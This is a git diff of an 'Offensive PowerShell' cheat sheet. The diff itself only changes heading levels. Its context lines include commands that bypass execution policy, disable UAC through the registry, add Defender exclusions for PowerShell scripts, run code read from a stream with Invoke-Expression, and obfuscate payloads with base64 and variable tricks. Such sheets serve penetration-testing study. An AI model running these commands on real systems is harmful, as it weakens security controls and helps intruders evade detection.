@@ -1,6 +1,6 @@
 # Offensive PowerShell
   
-### General PowerShell  
+## General PowerShell  
   
 ##### Cmdlet Help  
 `Get-Help <CMDLET>`  
@@ -9,9 +9,9 @@
 `$<STRING> = 'Write-Output "Test text!"'`  
 `Invoke-Expression $<STRING>`  
   
-### Domain Enumeration
+## Domain Enumeration
   
-### Local Enumeration
+## Local Enumeration
   
 ##### List all running processes  
 `Get-Process`  
@@ -31,7 +31,7 @@
 `Get-LocalGroup`  
 `Get-LocalGroupMember -Group <GROUP NAME>`  
   
-### Execution Policy  
+## Execution Policy  
   
 ##### Execution Policy Information  
 `Get-ExecutionPolicy -List`  
@@ -40,7 +40,7 @@
 `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`  
 `powershell -ep bypass`  
   
-### UAC
+## UAC
   
 ##### Get UAC Configuration  
 `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object -Property EnableLUA,ConsentPromptBehaviorAdmin`  
@@ -49,7 +49,7 @@
 ##### Disable UAC (requires admin)  
 `cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"`  
   
-### AV / Firewall  
+## AV / Firewall  
   
 ##### Get Firewall Information  
 ` Get-NetFirewallProfile`  
@@ -86,7 +86,7 @@
 ##### Exclude files by extension (requires admin)  
 `Set-MpPreference -ExclusionExtension "ps1"`  
   
-### Remote Code Execution  
+## Remote Code Execution  
   
 ##### Invoke-Command  
 `$computer = "<COMPUTER>"`  
@@ -135,7 +135,7 @@
 `$script = $reader.ReadToEnd()`  
 `Invoke-Expression $script`  
 
-### Code Obfuscation
+## Code Obfuscation
   
 ##### Base64 Decoding  
 `$encoded = "V3JpdGUtT3V0cHV0ICJUZXN0IHRleHQi"`  
@@ -172,5 +172,5 @@ ABC "Test!"
 `Set-Variable -Name $varName -Value (New-Object System.Net.WebClient)`  
 `$webclient`  
 
-### Persistence  
+## Persistence  
 
